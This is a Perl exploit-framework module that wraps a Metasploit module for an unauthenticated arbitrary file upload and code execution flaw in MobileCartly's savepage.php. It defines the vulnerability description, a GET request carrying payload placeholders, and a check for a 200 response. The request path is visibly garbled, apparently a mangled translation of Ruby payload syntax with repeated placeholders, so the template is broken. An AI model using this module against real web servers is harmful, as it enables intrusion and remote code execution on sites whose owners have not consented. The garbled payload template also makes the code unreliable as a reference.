package MSFExploits::Exploits::MOBILECARTLY::MSF::MobilecartlyUploadExec;
# use parent qw(MSFExploits::Exploit MSFExploits::Services::MOBILECARTLY);

use 5.10.0;

use strict;
use warnings;

no warnings 'experimental';

use URI::URL;
use Data::Dump qw(dump);
use Coro qw( async );

# # use MSFExploits::Functions::Basic;
# # use MSFExploits::Functions::Errors;
# # use MSFExploits::Functions::Content;

sub load {
    my $type  = shift;
    my $class = ref $type || $type;
    my $self = { };
    bless $self, $class;

    return $self;
}

sub new {
   my $class = shift;
   my ( $requester, $database ) = @_;

   my $name = "MobilecartlyUploadExec";

   my $DETECTION = {

   };

my $EXPLOIT = {
  DESCRIPTION => "

        This module exploits a vulnerability in MobileCartly.  The savepage.php file

        does not do any permission checks before using file_put_contents(), which

        allows any user to have direct control of that function to create files

        under the 'pages' directory by default, or anywhere else as long as the user

        has WRITE permission.

      ",
  METHOD => "GET",
  MSF_MODULE => "mobilecartly_upload_exec",
  OSVDB => 85509,
  PATH => "savepage=__SAVEPAGE__&pagecontent=>get_write_exec_payload(:unlink_self=__PAGECONTENT=>GET_WRITE_EXEC_PAYLOAD(:UNLINK_SELF__&",
  PATHS => ["mobilecartly/"],
  VARIABLES => {
    'PAGECONTENT=>GET_WRITE_EXEC_PAYLOAD(:UNLINK_SELF' =>       { DESCRIPTION => "", VALUE => "" },
    'SAVEPAGE' =>       { DESCRIPTION => "", VALUE => "" },
    'PATH' =>       {
  DESCRIPTION => "The base directory to MobileCartly",
  VALUE => "/mobilecartly/",
},
  },

  TYPE => 'MSF',
  PLATFORM => 'MULTI',
  REQUESTS => {
    EXPLOIT1 => {
      METHOD       => 'GET',
      PATH   => '',
      PAYLOAD      => '',
      TEXT   => 'Sending Exploit #1 Request : [GET] ',
      HEADERS      => {
        'Content-Type' => 'application/x-www-form-urlencoded',
      },
      VALIDATION   => {
        TCODE => ['200'],
      },
    },
  },
   };

   return $class->SUPER::new($requester, $database, $name, $DETECTION, $EXPLOIT, @_);
}

return 1;
